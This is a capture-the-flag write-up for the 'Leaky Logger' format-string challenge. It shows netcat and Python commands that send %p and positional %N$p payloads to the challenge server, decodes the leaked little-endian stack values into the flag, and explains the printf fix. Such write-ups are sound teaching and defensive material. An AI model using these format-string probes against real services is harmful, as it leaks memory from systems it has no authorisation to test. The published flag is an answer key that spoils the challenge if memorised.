# Leaky Logger — RSTCON CTF 2026

**Category:** Pwn / Binary Exploitation (Format String Vulnerability)  
**Challenge:** Leaky Logger  
**Solved by:** `0|)|-|0|2@`  
**Objective:** Recover the hidden flag by identifying and exploiting the program's input-handling vulnerability.  
**Environment:** Authorized CTF challenge server

> **Scope:** The following commands were used against the challenge's authorized environment. Do not test unknown systems without permission.

## 1. Connecting to the challenge

I first connected to the provided service with Netcat:

```bash
nc -w 3 18.215.143.250 9002
```

The service asked for a log line. I entered `hello` to confirm that it accepted user input. Next, I supplied several format specifiers:

```text
%p %p %p %p %p %p %p %p
```

Instead of echoing the string literally, the service printed hexadecimal-looking values and some `(nil)` values. This behavior suggested an **uncontrolled format string**: user input was potentially being used as the format argument to a function such as `printf()`.

<!-- Screenshot placeholder: add `images/leakylogger.1.png` to this repository. -->
<!-- ![Initial format-string probe](images/leakylogger.1.png) -->

## 2. Enumerating stack values

To inspect more positions in one request, I generated positional pointer specifiers with Python and piped them into the Netcat connection:

```bash
python3 -c 'print("|".join(f"%{i}$p" for i in range(1,80)))' | nc -w 3 18.215.143.250 9002
```

This generates a sequence such as:

```text
%1$p|%2$p|%3$p|...|%79$p
```

Here, `%p` asks `printf()` to display a pointer-like value. The positional form, `%N$p`, selects the *N*th argument, allowing different argument positions to be examined. The pipe character (`|`) separates results for easier reading.

The service returned many hexadecimal values, which I inspected for recognizable byte patterns.

<!-- Screenshot placeholder: add `images/leakylogger.2.png` to this repository. -->
<!-- ![Enumerating positional format specifiers](images/leakylogger.2.png) -->

## 3. Finding the encoded flag in leaked values

Near the end of the output, I observed the following values:

```text
0x667b6e6f63747372
0x74735f74616d7230
0x336c5f73676e3172
0x735f6568745f6b61
0x7d6b636174
```

These values contained bytes that looked like printable ASCII. On the challenge's x86-64 little-endian system, a multi-byte value is represented in memory with its least-significant byte first. To recover the text, I converted each hexadecimal number to bytes and reversed their order.

For example:

```text
Value:           0x667b6e6f63747372
Hex byte pairs:  66 7b 6e 6f 63 74 73 72
Reversed bytes:  72 73 74 63 6f 6e 7b 66
ASCII:           rstcon{f
```

Applying the same transformation to all five values gave:

| Leaked value | Little-endian ASCII |
|---|---|
| `0x667b6e6f63747372` | `rstcon{f` |
| `0x74735f74616d7230` | `0rmat_st` |
| `0x336c5f73676e3172` | `r1ngs_l3` |
| `0x735f6568745f6b61` | `ak_the_s` |
| `0x7d6b636174` | `tack}` |

The last value contains fewer than eight meaningful bytes, so it is decoded at its represented byte length rather than padded with nulls.

### Reproducing the decoding with Python

```python
leaks = [
    "667b6e6f63747372",
    "74735f74616d7230",
    "336c5f73676e3172",
    "735f6568745f6b61",
    "7d6b636174",
]

flag = "".join(bytes.fromhex(value)[::-1].decode("ascii") for value in leaks)
print(flag)
```

<!-- Screenshot placeholder: add `images/leakylogger.3.png` to this repository. -->
<!-- ![Recovered flag in the challenge output](images/leakylogger.3.png) -->

## 4. Final flag

```text
rstcon{f0rmat_str1ngs_l3ak_the_stack}
```

## 5. Root cause and takeaway

The responses indicate a **format string vulnerability**. When untrusted input is interpreted as a formatting template, specifiers such as `%p` can expose memory values that were never intended to be shown to the user. In this challenge, those leaked values were sufficient to reconstruct the flag.

The corresponding secure coding pattern is to pass user-controlled input as *data*, not as the format string:

```c
// Unsafe when log_line is user-controlled:
printf(log_line);

// Safe formatting pattern:
printf("%s", log_line);
```

**Lessons learned:** probe unexplained formatting behavior; use positional specifiers to examine leaked values systematically; consider endianness when interpreting hexadecimal words; and avoid treating user input as a format string.

---

*Write-up based on the solver's supplied steps and observations. No additional exploit steps or screenshots have been invented.*
